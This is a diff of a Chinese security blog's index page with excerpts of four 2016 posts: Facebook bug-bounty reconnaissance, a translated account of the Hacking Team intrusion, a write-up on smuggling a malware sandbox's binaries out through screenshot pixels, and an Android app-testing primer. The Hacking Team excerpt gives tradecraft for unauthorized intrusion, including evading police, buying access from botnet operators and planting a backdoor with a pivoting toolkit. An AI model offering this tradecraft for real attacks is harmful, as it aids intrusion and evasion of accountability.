-  <time datetime="2016-04-26T23:12:44.000Z" itemprop="datePublished">2016-04-27</time>
-</a>
+  <nav class="pagination" role="pagination">
     
-  <div class="article-category">
-    <a class="article-category-link" href="/category/渗透测试/">渗透测试</a>
-  </div>
-
-  </div>
-  <div class="article-inner">
-    
-    
-      <header class="article-header">
-        
-  
-    <h1 itemprop="name">
-      <a class="article-title" href="/1138.seo/">渗透Facebook的思路与发现</a>
-    </h1>
-  
-
-      </header>
-    
-    <div class="article-entry" itemprop="articleBody">
-      
-        <p><b>写在故事之前</b></p>  <p>身为一位<a href="http://ha.cker.in/tag/渗透测试" target="_blank">渗透测试</a>人员，比起 Client Side 的弱点我更喜欢 Server Side 的攻击，能够直接的控制服务器、获得权限操作 SHELL 才爽 &lt;(￣︶￣)&gt;</p>  <p>当然一次完美的渗透任何形式的弱点都不可小觑，在实际渗透时偶尔还是需要些 Client Side 弱点组合可以更完美的控制服务器，但是在寻找弱点时我本身还是先偏向以可直接进入服务器的方式来去寻找风险高、能长驱直入的弱点。</p>  <p>随着 <a href="http://ha.cker.in/tag/Facebook" target="_blank">Facebook</a> 在世界上越来越火红、用户量越来越多，一直以来都有想要尝试看看的想法，恰巧 <a href="http://ha.cker.in/tag/Facebook" target="_blank">Facebook</a> 在 2012 年开始有了 <a href="https://www.facebook.com/whitehat/">Bug Bounty</a> 奖金猎人的机制让我更跃跃欲试。</p>  <p>一般如由渗透的角度来说习惯性都会从收集数据、侦查开始，首先界定出目标在网络上的 “范围” 有多大，姑且可以评估一下从何处比较有机会下手。例如:</p>  <p>Google Hacking 到什么数据?</p>  <p>用了几个 B 段的 IP ? C 段的 IP ?</p>  <p>Whois? Reverse Whois?</p>  <p>用了什么域名? 内部使用的域名? 接着做子域名的猜测、扫描</p>  <p>公司平常爱用什么样技术、设备?</p>  <p>在 Github, Pastebin 上是否有泄漏什么信息?</p>  <p>…etc</p>  <p>当然 Bug Bounty 并不是让你无限制的攻击，将所搜集到的范围与 Bug Bounty 所允许的范围做交集后才是你真正可以去尝试的目标。</p>  <p>一般来说大公司在渗透中比较容易出现的问题点这里举几个例子来探讨</p>  <ol>   <li>对多数大公司而言，&quot;<b>网络边界</b>”是比较难顾及、容易出现问题的一块，当公司规模越大，同时拥有数千、数万台机器在线，网管很难顾及到每台机器。在攻防里，防守要防的是一个面，但攻击只需 找个一个点就可以突破，所以防守方相对处于弱势，攻击者只要找到一台位于网络边界的机器入侵进去就可以开始在内网进行渗透了!</li>    <li>对于 “<b>连网设备</b>” 的安全意识相对薄弱，由于连网设备通常不会提供 SHELL 给管理员做进一步的操作，只能由设备本身所提供的接口设定，所以通常对于设备的防御都是从网络层来抵挡，但如遇到设备本身的 0-Day 或者是 1-Day 可能连被入侵了都不自觉。</li>    <li>人的安全，随着 “<a href="http://ha.cker.in/tag/社工库" target="_blank">社工库</a><b></b>” 的崛起，有时可以让一次渗透的流程变得异常简单，从公开数据找出公司员工列表，再从社工库找到可以登入 VPN 的员工密码就可以开始进行内网渗透，尤其当社工库数量越来越多 “<b>量变成质变</b>” 时只要关键人物的密码在社工库中可找到，那企业的安全性就全然突破。</li> </ol>  <p>理所当然在寻找 <a href="http://ha.cker.in/tag/Facebook" target="_blank">Facebook</a> 弱点时会以平常进行渗透的思路进行，在开始搜集数据时除了针对 Facebook 本身域名查询外也对注册信箱进行 Reverse Whois 意外发现了个奇妙的域名名称</p><br>
-        
-          <p class="article-more-link">
-            <a href="/1138.seo/#more">Read More</a>
-          </p>
-        
-      
-    </div>
-    <footer class="article-footer">
-      <a data-url="http://id.cker.in/1138.seo/" data-id="cirz4nzt500ceoz76izd068xk" class="article-share-link">Share</a>
-      
-      
-  <ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tag/Auditd/">Auditd</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tag/Facebook/">Facebook</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tag/SSL-VPN/">SSL VPN</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tag/渗透测试/">渗透测试</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tag/社工库/">社工库</a></li></ul>
-
-    </footer>
-  </div>
-  
-</article>
-
-
-  
-    <article id="post-1137" class="article article-type-post" itemscope itemprop="blogPost">
-  <div class="article-meta">
-    <a href="/1137.seo/" class="article-date">
-  <time datetime="2016-04-20T18:02:09.000Z" itemprop="datePublished">2016-04-21</time>
-</a>
-    
-  <div class="article-category">
-    <a class="article-category-link" href="/category/渗透测试/">渗透测试</a>
-  </div>
-
-  </div>
-  <div class="article-inner">
-    
-    
-      <header class="article-header">
-        
-  
-    <h1 itemprop="name">
-      <a class="article-title" href="/1137.seo/">渗透Hacking Team过程</a>
-    </h1>
-  
-
-      </header>
-    
-    <div class="article-entry" itemprop="articleBody">
-      
-        <p>0x00 Hacking Team</p>  <p><a href="http://ha.cker.in/tag/Hacking Team" target="_blank">Hacking Team</a> 是一个协助政府hack和监视记者、政治家等的公司（详见段尾链接），当然有时候也会监控恐怖分子和罪犯。其CEO——Vincenzetti——很喜欢在他的邮件末尾加上一句纳粹标语“boia chi molla” (放弃者该死)，同时，他一直宣称拥有可以解决“Tor 问题”和“暗网问题”的技术。但是我一直很怀疑他的那种技术的有效性。</p>  <h3>0x01 小心点</h3>  <p>很不幸，我们的世界是颠倒的，你越做坏事越富有，越做好事反而被抓。但幸运的是，多亏了人们的努力，比如&quot;Tor项目&quot;，你可以通过以下指导来防止被人抓住把柄：</p>  <p>1) 加密的你的硬盘</p>  <p>如果有一天你做的事被发现了，警察叔叔带走了你的电脑，尽管被发现就意味着你已经犯了很多错误，但是加密硬盘会比不加密要好得多。</p>  <p>2) 使用虚拟机并且把所有的网络都走Tor</p>  <p>这样就实现了两点，第一、你的所有流量都匿名了。第二、把你的个人生活和匿名操作分开了，防止两种生活互相混合。</p>  <p>3) 不要直接连接<a href="http://ha.cker.in/tag/Tor" target="_blank">Tor</a>网络 (可选项)</p>  <p>Tor不是万能药，有可能你在连接到Tor网络的时候刚好在做坏事。也可能你在退出Tor网络的时候你同样在做坏事。最好还是用别人的wifi，或者连接vpn或者中转机子，然后连接Tor匿名网络。</p>  <h3>0x02 搜集信息</h3>  <p>尽管这个过程非常无聊，但却是非常重要，目标越大越多，漏洞出现的几率就越大。</p>  <h6>1 技术方面的信息</h6>  <p>主要使用以下各种方面的信息</p>  <p>1)Google</p>  <p>如果使用合适的语句，你可以发现大量的意外收获。</p>  <p>2)二级域名搜集</p>  <p>一般来说，域名大部分都是又第三方公司提供的，你需要寻找到其域名的IP范围。当然，有时候会存在DNS域传送漏洞，这样就更好搜集信息了。</p>  <p>3)Whois查询和反向查询</p>  <p>通过各种Whois查询和其ip范围的域名反向查询，你也可以获得很多其他子域名，据我所知，没有免费的反向查询，除非谷歌hack。</p>  <p>4)端口扫描和指纹提取</p>  <p>和其他的技术不同，你可以跟公司的员工聊天。我把它作为可选项放在这里因为它不是一种攻击方式，只是搜集信息的一种方式。在扫描的过程中，该业务的入侵检测系统可能会告警，但是不用担心，整个Inernet都经常会扫描自身。</p>  <p>对于扫描来说，<a href="http://ha.cker.in/tag/nmap" target="_blank">Nmap</a>是再合适不过了，它也可以识别各种服务的指纹。但是对于大规模网络来说，zmap和masscan更快速。WhatWeb和BlindElephant 适合抓取web指纹。</p>  <h6>2 社工信息</h6>  <p>对于社会工程学来说，搜集员工信息非常重要，包括他们的各自的角色，合约，使用的操作系统，浏览器，插件，软件等。一般使用如下途径：</p>  <p>1)Google</p>  <p>这也是最有用的工具。</p>  <p>2)theHarvester y recon-ng</p>  <p>我在上一个内容中就提到了这些东西，但是他们其实还有更多的用处。你可以自动快速地找到大量的信息，这也值得你去花时间阅读官方文档。</p>  <p>3)LinkedIn</p>  <p>你可以通过这个软件获取到大量的雇员信息，内部人员总是倾向于与他人交流。</p>  <p>4)Data.com</p>  <p>它就像拼图一样把各种信息整合在一起。</p>  <p>5)File metadata</p>  <p>你可以在他们公司发布的各种文档中找到大量有用的信息。</p>  <h3>0x03 打入内网</h3>  <p>进入内网的方式有很多种。我打入HT内网的方式是不常见的，而且比平时花的精力要多得多，所以我在这里提一下进入内网的两种常见的方式，这两种也是我推荐的。</p>  <h6>1 社工</h6>  <p>社会工程学，尤其是鱼叉式网络钓鱼，是各种渗透技巧中比较可靠的一种。更多技巧请移步段尾链接。我不想尝试对HT进行钓鱼攻击，因为这种攻击方式对他们来说太常见了，所以他们会非常警惕。既增加了难度，又容易被发现我的意图。 </p>  <p><a href="http://www.hacknbytes.com/2016/01/apt-pentest-con-empire.html">http://www.hacknbytes.com/2016/01/apt-pentest-con-empire.html</a></p>  <p><a href="http://blog.cobaltstrike.com/2015/09/30/advanced-threat-tactics-course-and-notes/">http://blog.cobaltstrike.com/2015/09/30/advanced-threat-tactics-course-and-notes/</a></p>  <p><a href="http://www.netcomunity.com/lestertheteacher/doc/ingsocial1.pdf">http://www.netcomunity.com/lestertheteacher/doc/ingsocial1.pdf</a></p>  <h6>2 购买权限</h6>  <p>多亏了勤劳的俄罗斯人和他们的渗透工具 “traffic sellers”和“bot herders”，许多公司都已经有了被入侵的电脑。几乎所有世界五百强的大型网络中都存在一些被入侵的机器。但是Hacking Team是个小公司，他们的大多数员工都是信息安全专家，所以他们内部存在被入侵机器的可能性非常小。</p>  <h5>3 技术入侵</h5>  <p>Gamma公司被黑以后，我就已经描述了一个寻找漏洞的过程：</p>  <pre><a href="http://pastebin.com/raw.php?i=cRYvK4jb">http://pastebin.com/raw.php?i=cRYvK4jb</a></pre><br><br><p>Hacking Team有一个段的公网IP:</p>
-
-<pre>inetnum:&#160;&#160;&#160;&#160;&#160;&#160;&#160; 93.62.139.32 - 93.62.139.47</pre>
-
-<pre>descr:&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160; HT public subnet</pre>
-
-<p>他们的网络有少量暴露在外网，比如不像Gamma公司，他们的公网地址都需要证书才能连接。HT的公网服务器主要有一个Joomla的博客(joomscan没有扫出来有用的东西)，一个邮件服务器，几个路由，两个VPN，一个垃圾邮箱过滤系统。所以我现在只能通过以下方式获取权限：发现一个Joomla的0day，或者postfix的0day，或者他们其他一个系统的0day。嵌入式系统的0day对于我来说比较靠谱点，于是我花了两周的时间，通过逆向发现了一个命令执行0day。这个0day至今仍然没有修复，所以我也不方便给出更多细节。</p>
-
-<h3>0x04 事前准备</h3>
-
-<p>在正式攻击之前，我做了很多测试和准备，在硬件里面写入了一个后门，并且在嵌入式系统上编译了各种各样的工具：</p>
-
-<p>1) busybox</p>
-
-<p>这个工具大多数的Unix系机器都没有。</p>
-
-<p>2)nmap</p>
-
-<p>扫描工具</p>
-
-<p>3)Responder.py</p>
-
-<p>内网中间人攻击神器</p>
-
-<p>4)python</p>
-
-<p>这个必须得有</p>
-
-<p>5)tcpdump</p>
-
-<p>抓包</p>
-
-<p>6)dsniff</p>
-
-<p>在内网中嗅探各种密码之类的，我更喜欢用HT的ettercap，但是编译起来很麻烦。</p>
-
-<p>7)socat</p>
-
-<p>NC的升级版，主要端口转发</p>
-
-<p>8)screen</p>
-
-<p>可以让你多窗口执行命令，其实也不是太需要</p>
-
-<p>9)socks5代理主机</p>
-
-<p>加上proxychains，插入内网</p>
-
-<p>10)tgcd</p>
-
-<p>通过转发端口，穿透防火墙</p>
-
-<p>最坑的事儿就是你把后门和工具部署上去之后，系统挂了，然后运维上去一看，全完了。所以我花了一周的时间在最后的部署之前测试我的各种后门和exp。</p><br>
-        
-          <p class="article-more-link">
-            <a href="/1137.seo/#more">Read More</a>
-          </p>
-        
-      
-    </div>
-    <footer class="article-footer">
-      <a data-url="http://id.cker.in/1137.seo/" data-id="cirz4nzt100c6oz76w6uiqgde" class="article-share-link">Share</a>
-      
-      
-  <ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tag/Hacking-Team/">Hacking Team</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tag/Tor/">Tor</a></li></ul>
-
-    </footer>
-  </div>
-  
-</article>
-
-
-  
-    <article id="post-1136" class="article article-type-post" itemscope itemprop="blogPost">
-  <div class="article-meta">
-    <a href="/1136.seo/" class="article-date">
-  <time datetime="2016-04-07T18:44:39.000Z" itemprop="datePublished">2016-04-08</time>
-</a>
-    
-  <div class="article-category">
-    <a class="article-category-link" href="/category/黑客技巧/">黑客技巧</a>
-  </div>
-
-  </div>
-  <div class="article-inner">
-    
-    
-      <header class="article-header">
-        
-  
-    <h1 itemprop="name">
-      <a class="article-title" href="/1136.seo/">特殊条件数据传输</a>
-    </h1>
-  
-
-      </header>
-    
-    <div class="article-entry" itemprop="articleBody">
-      
-        <p>0x00 借问酒家</p>  <hr align="center" size="0" width="100%" noshade="noshade">  <p>有什么东西想拿却拿不出来？不妨开开脑洞。</p>  <p><a href="http://img.cker.in/53bfa74f0ee9_9640/clip_image001.png" target="_blank" rel="external"><img style="border-bottom: 0px; border-left: 0px; display: inline; border-top: 0px; border-right: 0px" title="clip_image001" border="0" alt="clip_image001" src="http://img.cker.in/53bfa74f0ee9_9640/clip_image001_thumb.png" width="1051" height="444"></a></p>  <p>缘起是2014年底的时候看到金山做的在线恶意代码分析系统“Fire eye”（<a href="https://fireeye.ijinshan.com/）。感觉很新鲜，丢了自己攒的几个样本丢了上去，分析的结果还算可以。从分析报告来看，它也是一类沙箱检测工具，把样本丢到虚拟机里跑，再在虚拟机内外布控，监测样本的各种行为，最后生成分析报告并给出判断是否恶意样本，分析报告里还包含样本运行时的截图。" target="_blank" rel="external">https://fireeye.ijinshan.com/）。感觉很新鲜，丢了自己攒的几个样本丢了上去，分析的结果还算可以。从分析报告来看，它也是一类沙箱检测工具，把样本丢到虚拟机里跑，再在虚拟机内外布控，监测样本的各种行为，最后生成分析报告并给出判断是否恶意样本，分析报告里还包含样本运行时的截图。</a></p>  <p><a href="http://img.cker.in/53bfa74f0ee9_9640/clip_image002.png" target="_blank" rel="external"><img style="border-bottom: 0px; border-left: 0px; display: inline; border-top: 0px; border-right: 0px" title="clip_image002" border="0" alt="clip_image002" src="http://img.cker.in/53bfa74f0ee9_9640/clip_image002_thumb.png" width="795" height="904"></a></p>  <p>0x01 柳暗</p>  <hr align="center" size="0" width="100%" noshade="noshade">  <p>于是我开始有点好奇，这个沙箱大概是个什么样的，于是自己写了一些小的检测程序丢进去，把环境变量、系统信息、网络配置、进程列表、服务和驱动什么的读出来显示在窗体上，这样从分析报告里的样本截图就能读到这些信息了。</p>  <p>嘛，这里先说一下，本人并不会挖漏洞和逆向，说来惭愧，大学时候的汇编都是补考才过的。就是个小小的.net码农而已。</p>  <p>然后我在系统环境变量里发现一个别的地方没有的玩意：%FEKERNEL%，指向c:\mon\文件夹，想来应该是“FIRE EYE KERNEL”，即包含沙箱内部监控程序的核心文件夹。</p>  <p>有了这个发现自然不会放过，另外专门编写了程序去枚举和读取FEKERNEL里的东西，然而发现只要碰了那个文件夹，样本分析报告就会被隐去大部分内容，和FEKERNEL文件夹直接和间接（比如复制出来之后再读取复制的文件）相关的内容都被删掉了，想来应该是做了某种自我保护。只有读取文件夹大小的操作没被拦截。</p>  <p>0x02 花明</p>  <hr align="center" size="0" width="100%" noshade="noshade">  <p>不过既然有了目标，路就好找了。试了几次找到了绕过保护的办法，成功读取到了FEKERNEL里的文件并把详细信息。下一步当然就是如何拿到里面的东西咯。</p>  <p>里面是大概几十MB的二进制文件，有EXE有DLL有SYS甚至还有PDB，估计是开发人员方便调试直接把符号文件也一起扔里面了。这么多东西怎么拿出来呢？最初的想法是通过网络传出来，然而沙箱的网络和互联网是不通的，对用户的唯一输出仅限样本分析报告。</p>  <p>然后我发现早几年前有人通过编写样本在注册表里写入HTML代码内容的键值在分析报告页面成功实施了XSS，觉得这个思路是可行的。然而几十MB的东西即便压缩成十几MB再按BASE64编码，写到一个监控程序会监控的地方，仍然没法全部拿出来，因为太多了。就算画在窗体上也…………</p>  <p>……慢着，画在窗体上？</p>  <p>脑袋灵光一闪，这办法可以啊！我先想到的是把BASE64串按能分辨的最小字号写在窗体上，然后进一步想到干脆利用窗体上的像素，一个像素表示一个字节，然后直接想到干脆一个像素用RGB分量存储三个字节，这样可输出的数据量就成几何级数上升。稍微计算了一下，按最高密度的数据传输方案，一个窗体能被截图下来的最大面积足够“画下”压缩过的完整目标数据。</p>  <p>思路有了，东西直接就搞出来了。由于FE只能上传单个可执行文件样本，于是把所有用到的东西打包成一个自解压RAR，并附带解压后执行脚本，先绕过保护读取到FEKERNEL里的所有内容并复制到另外的位置，然后用自带的WINRAR.EXE通过命令行将其压缩，最后把压缩包以二进制打开，把内容“画”在自己窗体上。</p>  <p><a href="http://img.cker.in/53bfa74f0ee9_9640/clip_image003.png" target="_blank" rel="external"><img style="border-bottom: 0px; border-left: 0px; display: inline; border-top: 0px; border-right: 0px" title="clip_image003" border="0" alt="clip_image003" src="http://img.cker.in/53bfa74f0ee9_9640/clip_image003_thumb.png" width="1002" height="784"></a></p>  <p>这样我就顺利拿到了FEKERNEL里的所有东西。当然这还得感谢FE在处理样本截图的时候没有做任何有损压缩，虽然是JPEG格式。</p>  <p>这个漏洞我已在去年提交给乌云：<a href="http://www.wooyun.org/bugs/wooyun-2015-0101934" target="_blank" rel="external">火眼恶意代码分析系统自保机制绕过导致二进制泄露</a></p>  <p>0x03 又一村</p>  <hr align="center" size="0" width="100%" noshade="noshade">  <p>总结：如果有什么东西你知道在哪，但没法直接拿到，不妨冷静分析一下：</p>  <p>1. 你能控制的输入因素有哪些；</p>  <p>2. 阻拦你拿到数据的限制因素有什么，有没有绕过的办法；</p>  <p>3. 你能拿到的输出数据有哪些，其中哪些可以通过输入数据直接或间接控制，哪些输出数据包含的信息量最大。</p>  <p>综合考虑这三方面因素，并仔细分析，就不难达成目标了。</p>
-      
-    </div>
-    <footer class="article-footer">
-      <a data-url="http://id.cker.in/1136.seo/" data-id="cirz4nzt900cioz76zi47eywf" class="article-share-link">Share</a>
-      
-      
-    </footer>
-  </div>
-  
-</article>
-
-
-  
-    <article id="post-1135" class="article article-type-post" itemscope itemprop="blogPost">
-  <div class="article-meta">
-    <a href="/1135.seo/" class="article-date">
-  <time datetime="2016-04-06T17:18:43.000Z" itemprop="datePublished">2016-04-07</time>
-</a>
-    
-  <div class="article-category">
-    <a class="article-category-link" href="/category/N900-IPhone-Android/">N900-IPhone-Android</a>
-  </div>
-
-  </div>
-  <div class="article-inner">
-    
-    
-      <header class="article-header">
-        
-  
-    <h1 itemprop="name">
-      <a class="article-title" href="/1135.seo/">Android APP安全测试入门</a>
-    </h1>
-  
-
-      </header>
-    
-    <div class="article-entry" itemprop="articleBody">
-      
-        <p><b>背景</b></p>  <p>最近这两年移动端真是非常火，每个单位或多或少都会有那么几款App，对于我们Web安全攻城师来说，App安全也需要或多或少的了解一些。年初单位来了一位对App安全略有研究的小伙伴，某日闲来无事教了笔者几招，分享给大家。有句古语:”工欲善其事，必先利其器”，我们要研究App安全，没有几款高大上的神器是会非常麻烦的，因此本文主要给大家分享一下笔者学到的一些基础知识，主要是一些移动端测试辅助工具的使用。</p>  <p><b>模拟器</b></p>  <p>模拟器笔者经常使用有两款，一款是<a href="http://ha.cker.in/tag/BlueStacks" target="_blank">BlueStacks</a>，这款个人感觉是做的非常不错的，一般安装操作App非常流畅，不会有卡死的情况。另外一款就是SDK模拟器(Software Development Kit)了，这款是特别高大上的，类似虚拟机vm一样，可以建立多个虚拟机，安装不同的android系统。</p>  <p><b>BlueStacks</b></p>  <p>下载地址：</p>  <p><a href="http://www.bluestacks.net.cn/Download/">http://www.bluestacks.net.cn/Download/</a></p>  <p>安装的时候会提示安装”给力助手”，给力助手是辅助操作的，可以安装电脑上下载的app安装包到模拟器，也可以卸载已经安装的，还有很多针对模拟器的设置功能，如图：</p>  <p><a href="http://img.cker.in/AndroidAPP_DE31/clip_image001.jpg"><img style="border-bottom: 0px; border-left: 0px; display: inline; border-top: 0px; border-right: 0px" title="clip_image001" border="0" alt="clip_image001" src="http://img.cker.in/AndroidAPP_DE31/clip_image001_thumb.jpg" width="872" height="542" /></a></p>  <p>BlueStacks安装之后，安装APP，打开App界面如图：</p>  <p><a href="http://img.cker.in/AndroidAPP_DE31/clip_image002.jpg"><img style="border-bottom: 0px; border-left: 0px; display: inline; border-top: 0px; border-right: 0px" title="clip_image002" border="0" alt="clip_image002" src="http://img.cker.in/AndroidAPP_DE31/clip_image002_thumb.jpg" width="494" height="768" /></a></p>  <p>功能方面使用都非常简单，本文就不做介绍了。</p>  <p><b>Software Development Kit</b></p>  <p>下载地址：</p>  <p><a href="http://developer.android.com/sdk/index.html">http://developer.android.com/sdk/index.html</a></p>  <p>下载之后打开包中的eclipse，然后进行模拟器Android镜像的下载，包中自带的镜像是Android 5.0的镜像，建议下载老版本的，方便测试App，新版的镜像部分App在安装的过程中可能会有不兼容的情况。   <br />SDK Android镜像的下载如下图所示：</p>  <p><a href="http://img.cker.in/AndroidAPP_DE31/clip_image003.jpg"><img style="border-bottom: 0px; border-left: 0px; display: inline; border-top: 0px; border-right: 0px" title="clip_image003" border="0" alt="clip_image003" src="http://img.cker.in/AndroidAPP_DE31/clip_image003_thumb.jpg" width="945" height="721" /></a></p>  <p></p><br>
-        
-          <p class="article-more-link">
-            <a href="/1135.seo/#more">Read More</a>
-          </p>
-        
-      
-    </div>
-    <footer class="article-footer">
-      <a data-url="http://id.cker.in/1135.seo/" data-id="cirz4nzsr00broz76eymf2jam" class="article-share-link">Share</a>
-      
-      
-  <ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tag/BlueStacks/">BlueStacks</a></li></ul>
-
-    </footer>
-  </div>
-  
-</article>
-
-
-  
-
-
-  <nav id="page-nav">
-    <span class="page-number current">1</span><a class="page-number" href="/page/2/">2</a><a class="page-number" href="/page/3/">3</a><span class="space">&hellip;</span><a class="page-number" href="/page/34/">34</a><a class="extend next" rel="next" href="/page/2/">__('next') &raquo;</a>
+    <span class="page-number">Page 1 of 57</span>
+    <a class="older-posts" href="/page/2/">Older Posts →</a>
   </nav>
-</section>
-        
-          <aside id="sidebar">
+</main>
+
+
+      
+<footer class="site-footer">
   
-    
-  <div class="widget-wrap">
-    <h3 class="widget-title">Categories</h3>
-    <div class="widget">
-      <ul class="category-list"><li class="category-list-item"><a class="category-list-link" href="/category/CPP-C-ASPNET-PHP-Js/">CPP-C#-ASPNET-PHP-Js</a></li><li class="category-list-item"><a class="category-list-link" href="/category/N900-IPhone-Android/">N900-IPhone-Android</a></li><li class="category-list-item"><a class="category-list-link" href="/category/Web安全/">Web安全</a></li><li class="category-list-item"><a class="category-list-link" href="/category/linux笔记/">linux笔记</a></li><li class="category-list-item"><a class="category-list-link" href="/category/原创文章/">原创文章</a></li><li class="category-list-item"><a class="category-list-link" href="/category/影音娱乐/">影音娱乐</a></li><li class="category-list-item"><a class="category-list-link" href="/category/无线安全/">无线安全</a></li><li class="category-list-item"><a class="category-list-link" href="/category/渗透工具、攻防视频/">渗透工具、攻防视频</a></li><li class="category-list-item"><a class="category-list-link" href="/category/渗透测试/">渗透测试</a></li><li class="category-list-item"><a class="category-list-link" href="/category/疑难杂症/">疑难杂症</a></li><li class="category-list-item"><a class="category-list-link" href="/category/精品软件/">精品软件</a></li><li class="category-list-item"><a class="category-list-link" href="/category/絮叨碎语/">絮叨碎语</a></li><li class="category-list-item"><a class="category-list-link" href="/category/黑客技巧/">黑客技巧</a></li></ul>
-    </div>
-  </div>
-
-
-  
-    
-  <div class="widget-wrap">
-    <h3 class="widget-title">Tags</h3>
-    <div class="widget">
-      <ul class="tag-list"><li class="tag-list-item"><a class="tag-list-link" href="/tag/net/">.net</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tag/0day/">0day</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tag/12306/">12306</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tag/12306刷票外挂/">12306刷票外挂</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tag/12306刷票外挂下载/">12306刷票外挂下载</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tag/1521/">1521</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tag/3389/">3389</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tag/3600safe/">3600safe</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tag/ACL/">ACL</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tag/APT/">APT</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tag/ASP/">ASP</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tag/ASP中FSO的神奇功能/">ASP中FSO的神奇功能</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tag/ATM/">ATM</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tag/ActionScript中shellcode的定位和提取/">ActionScript中shellcode的定位和提取</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tag/ActionScript的反汇编和反编译/">ActionScript的反汇编和反编译</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tag/Acunetix-Web-Vulnerability-Scanner/">Acunetix Web Vulnerability Scanner</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tag/Anonymous/">Anonymous</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tag/Apache/">Apache</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tag/Armitage/">Armitage</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tag/Auditd/">Auditd</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tag/BDFProxy/">BDFProxy</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tag/Base64变异注入/">Base64变异注入</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tag/Base64变形注入/">Base64变形注入</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tag/Beacon/">Beacon</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tag/Bettercap/">Bettercap</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tag/BlueStacks/">BlueStacks</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tag/Brup-Suite/">Brup Suite</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tag/C/">C#</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tag/CANVAS/">CANVAS</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tag/CPanel/">CPanel</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tag/CSRF/">CSRF</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tag/CentOS/">CentOS</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tag/Chrome/">Chrome</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tag/Cobalt-Strike/">Cobalt Strike</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tag/ColdFusion/">ColdFusion</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tag/Crack/">Crack</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tag/Csdn/">Csdn</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tag/C段/">C段</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tag/DDos/">DDos</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tag/DJ/">DJ</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tag/DLL劫持漏洞/">DLL劫持漏洞</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tag/DNS/">DNS</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tag/DNS劫持/">DNS劫持</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tag/DRDoS/">DRDoS</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tag/Damn-Small-Linux/">Damn Small Linux</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tag/Debian/">Debian</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tag/DedeCMS/">DedeCMS</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tag/Discuz/">Discuz</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tag/Discuz-X2-5/">Discuz!X2.5</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tag/Discuz-X2升级/">Discuz!X2升级</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tag/Docker/">Docker</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tag/ESX/">ESX</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tag/ESXi/">ESXi</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tag/Exchange/">Exchange</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tag/Exploit/">Exploit</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tag/FSO/">FSO</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tag/FTP/">FTP</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tag/Facebook/">Facebook</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tag/FastCGI/">FastCGI</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tag/Flash文件的提取/">Flash文件的提取</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tag/Fuzzing/">Fuzzing</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tag/GEA翻墙/">GEA翻墙</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tag/GWF/">GWF</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tag/Get-Shell/">Get Shell</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tag/Godaddy/">Godaddy</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tag/Google-Hack/">Google Hack</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tag/Group-By一个不常用的用法/">Group By一个不常用的用法</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tag/HTML5/">HTML5</a></li><li class="tag-list-item"><a 